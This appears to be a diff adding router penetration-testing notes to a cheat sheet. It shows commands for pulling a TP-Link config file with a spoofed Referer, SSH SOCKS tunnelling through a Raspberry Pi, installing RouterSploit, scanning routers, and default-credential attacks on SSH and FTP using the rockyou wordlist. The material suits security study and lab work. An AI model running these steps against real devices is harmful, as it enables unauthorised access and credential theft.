@@ -145,15 +145,62 @@ The more you understand your target, the better the chance identifying a vulnera
 curl -s -k -X GET -H "Referer:http://<IP>/mainFrame.htm" http://<IP>/cgi/conf.bin > conf.bin
 python3 tpconf_bin_xml.py conf.bin conf.xml
 
+Port binding (remote)
+------
+Create a new firefox profile for proxy settings
+In the browser URL bar type about:profiles
+
+In order to forward the port 80 traffic from the raspberrypi to our laptops we must execute ssh with the -D argument and random high port number
+
+ssh -D 21212 pi@<IP>
+
+Whatever your random high port is, we will set up our FIREFOX browser to serve as a http proxy
+(Network setting, manual proxy)
+
+Routersploit
+-------------------
+sudo apt-get install git python3-pip
+
+git clone https://github.com/threat9/routersploit
+
+cd routersploit
+
+python3 -m pip install -r requirements.txt
+
+python3 rsf.py
+
+Scanners
+----
+First, check which scanners are installed:
+--
+search scanner
+
+To use a scanner, select it and set options
+--
+use scanners/routers/router_scan OR use scanners/dlink_scan
+
+show options
+--
+set target <IP> 
+run
 
 
+Target SSH
+----
+search tplink
+use creds/routers/tplink/ssh_default_creds
+show options
+set target <IP>
+run
 
 
-
-
-
-
-
+Target FTP
+----
+use creds/routers/linksys/ftp_default_creds
+show options
+set target <IP>
+set defaults file: /opt/rockyou.txt
+run
 
 
 
